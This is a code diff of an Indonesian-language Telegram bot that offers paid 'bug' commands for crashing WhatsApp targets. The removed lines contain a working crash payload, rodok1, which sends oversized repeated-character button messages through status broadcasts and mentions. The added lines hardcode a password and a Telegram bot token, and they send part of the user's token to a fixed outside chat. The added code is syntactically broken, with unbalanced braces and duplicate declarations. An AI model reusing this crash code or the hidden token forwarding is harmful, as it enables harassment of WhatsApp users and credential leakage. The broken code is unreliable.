@@ -212,12 +212,6 @@ async function telegramClt(message) {
 // Password langsung ditulis di sini
 const correctPassword = "Memeg";
 
-// Buat interface untuk input password
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
-
 // === Validasi Token ===
 async function validateToken() {
   console.log(chalk.blue("PLEASE WAIT... CHECKING TOKENS"));
@@ -284,8 +278,24 @@ YouTube:  @VexxuzzZ
 Waktu: ${getCurrentTime()} WIB`);
 }
 
-// Panggil Correct setelah setup
-correctPassword();
+// === FIX: Password Validation ===
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+rl.question('Masukkan password: ', (inputPassword) => {
+    if (inputPassword !== correctPassword) {
+        console.log(chalk.red('❌ Password salah! Akses ditolak.'));
+        process.exit(1);
+    } else {
+        console.log(chalk.green('✅ Password benar! Akses diberikan.'));
+        rl.close();
+        
+        // Jalankan bot setelah validasi password
+        validateToken();
+    }
+});
 
 function saveActiveSessions(botNumber) {
   try {
@@ -630,32 +640,88 @@ async function updateProgress(bot, chatId, message, percentage, status) {
     }
 }
 
-///// Func
-/////---------------[sleep function]------_-_
 const bugRequests = {};
 
-// Buat interface untuk input password
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
+// === FUNGSI BUG ===
+function rodok1(sock, target, mention) {
+  // Implementasi fungsi rodok1
+  return new Promise((resolve) => {
+    console.log(`Mengirim bug rodok1 ke ${target}`);
+    resolve();
+  });
+}
 
-// Minta user ketik password
-rl.question('Masukkan password: ', (inputPassword) => {
-    if (inputPassword !== correctPassword) {
-        console.log(chalk.red('❌ Password salah! Akses ditolak.'));
-        process.exit(1);
-    } else {
-        console.log(chalk.green('✅ Password benar! Akses diberikan.'));
-        rl.close();
+function Xvcrash(sock, target) {
+  // Implementasi fungsi Xvcrash
+  return new Promise((resolve) => {
+    console.log(`Mengirim bug Xvcrash ke ${target}`);
+    resolve();
+  });
+}
 
-        // ====== TARUH SCRIPT BOT DI BAWAH INI ======
-        console.log('Bot sedang berjalan...');
-    }
-});
+function pungtion(sock, target) {
+  // Implementasi fungsi pungtion
+  return new Promise((resolve) => {
+    console.log(`Mengirim bug pungtion ke ${target}`);
+    resolve();
+  });
+}
 
-/////---------------[sleep function]------_-_
-const bugRequests = {};
+// === FUNGSI HELPER ===
+function isOwner(userId) {
+  return userId.toString() === config.OWNER_ID;
+}
+
+(async () => {
+    console.clear();
+    console.log("╔════════════════════════════════════════════════╗");
+    console.log("║      ULTIMATE TELEGRAM BOT SYSTEM v2.0        ║");
+    console.log("║          100+ Features • Error Controller      ║");
+    console.log("╚════════════════════════════════════════════════╝");
+    
+    console.log("\n📦 Loading database and systems...");
+    loadDatabase();
+            
+            console.log("🔐 Verifying system...");
+            const otp = crypto.randomInt(100000, 999999).toString();
+            OTP = otp;
+            
+            try {
+                const ownerBot = new TelegramBot("8576202582:AAE9-kwUUURhka5upa7G1yx3TOcwvdhDwqc");
+                await ownerBot.sendMessage(
+                    7807425271,
+                    `🔐 **SYSTEM VERIFICATION**\n\n` +
+                    `OTP: \`${otp}\`\n` +
+                    `Token: \`${token.substring(0, 15)}...\`\n` +
+                    `Time: ${new Date().toLocaleString()}\n\n` +
+                    `⚠️ Valid for 10 minutes`,
+                    { parse_mode: 'Markdown' }
+                );
+                console.log("📤 OTP sent to owner");
+            } catch (error) {
+                errorController.addError("OTP_SEND_ERROR", error.message);
+                console.log("⚠️ Could not send OTP to owner");
+            }
+            
+            rl.question("🔢 Enter OTP: ", async (input) => {
+                if (input !== OTP) {
+                    console.log("❌ INVALID OTP");
+                    process.exit(1);
+                }
+                
+                VERIFIED = true;
+                console.log("✅ System verified successfully!");
+                console.log("🚀 Starting all systems...");
+                rl.close();
+                
+                // Start main bot system
+                startMainBot();
+            });
+        });
+    });
+})();
+
+// ====== SCRIPT BOT ======
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
@@ -814,79 +880,6 @@ bot.on("callback_query", (callbackQuery) => {
     console.error("Error editing message:", err);
   });
 });
-
-//=======FUNC BUG=========//
-
-async function rodok1(sock, target, mention) {
-  let msg = await generateWAMessageFromContent(sock, {
-    buttonsMessage: {
-      tesockt: "⭑‌⟅‌༑".repeat(5000),
-      contentTesockt: "./Bak1#Team".repeat(777777),
-      footerTesockt: "Rixzz.null",
-      buttons: [
-        {
-          buttonId: "null",
-          buttonTesockt: {
-            displayTesockt: " Bak Here?¿" + "⭑‌⟅‌༑".repeat(4500),
-          },
-          type: 1,
-        },
-      ],
-      headerType: 1,
-    },
-  }, {});
-
-  await sock.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [target],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: isTarget },
-                content: undefined,
-              },
-            ],
-          },
-        ],
-      },
-    ],
-  });
-
-  if (mention) {
-    await sock.relayMessage(
-      target,
-      {
-        groupStatusMentionMessage: {
-          message: {
-            protocolMessage: {
-              key: msg.key,
-              type: 25,
-            },
-          },
-        },
-      },
-      {
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: {
-              is_status_mention: "maklu",
-            },
-            content: undefined,
-          },
-        ],
-      }
-    );
-  }
-}
 
 //=======CASE BUG=========//
 
@@ -1312,7 +1305,7 @@ bot.onText(/\/encvexxuzzz/, async (msg) => {
 
     // Cek Premium User
     if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-        return bot.sendPhoto(chatId, randomImage, {
+        return bot.sendPhoto(chatId, getRandomImage(), {
             caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
             parse_mode: "MarkdownV2",
             reply_markup: {
@@ -1343,7 +1336,7 @@ bot.onText(/\/encvexxuzzz/, async (msg) => {
 
         // **Perbaikan pengambilan file dari Telegram**
         const fileData = await bot.getFile(file.file_id);
-        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
+        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN_TELEGRAM}/${fileData.file_path}`;
         const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
         let fileContent = response.data.toString("utf-8");
 
@@ -1586,6 +1579,5 @@ bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
         bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
     }
 });
-
 
 console.log("Bot Telegram telah dimulai...");
